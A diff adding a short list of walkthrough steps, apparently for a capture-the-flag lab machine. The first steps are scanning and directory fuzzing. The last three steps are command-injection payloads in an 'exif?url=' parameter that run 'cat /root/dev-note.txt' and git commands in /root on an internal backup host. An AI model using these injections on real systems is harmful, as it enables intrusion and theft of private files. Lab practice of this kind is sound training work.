@@ -1,0 +1,11 @@
+1 - nmap -A 10.10.93.238
+2 - http://10.10.93.238/robots.txt
+3 - dirb http://10.10.93.238/.well-known -X .txt
+4 - http://10.10.93.238/.well-known/security.txt
+5 - curl -I http://10.10.93.238/api/flXX
+6 - http://10.10.93.238/exif-tool/
+7 - ffuf -u http://10.10.93.238/FUZZ.bak.txt -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -mc 200
+8 - http://10.10.93.238/exif-util -> http://api-dev-backup:8080/exif?url=id; cat /root/dev-note.txt
+9 - http://api-dev-backup:8080/exif?url=id; cd /root; git log
+10 - http://api-dev-backup:8080/exif?url=id; cd /root; git show COMMIT
+11 - 
